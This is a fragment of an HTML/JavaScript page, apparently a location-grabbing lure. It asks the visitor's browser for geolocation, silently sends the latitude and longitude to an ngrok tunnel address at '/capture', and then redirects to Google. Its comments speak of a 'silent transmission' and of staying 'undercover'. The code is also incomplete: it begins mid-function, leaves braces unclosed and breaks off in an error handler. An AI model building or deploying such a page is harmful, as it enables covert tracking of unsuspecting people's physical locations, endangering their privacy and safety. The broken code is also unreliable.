<!DOCTYPE html>

            // Sir, if the browser is from the stone age, we handle it here
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, showError);
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        }

        function sendData(position) {
            // STEP 1: Replace this with your actual link from the ngrok terminal
            const url = "https://kathi-lated-originatively.ngrok-free.dev/capture";
            
            // STEP 2: The silent transmission
            fetch(url, {

                mode: 'cors', // Crucial for ngrok to play nice
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                })
            })
            .then(() => {
                // STEP 3: The "nothing to see here" redirect
                window.location.href = "https://www.google.com";
            })
            .catch(err => {
                // If it fails, we still redirect to stay undercover
                window.location.href = "https://www.google.com";
            });

        function showError(error) {
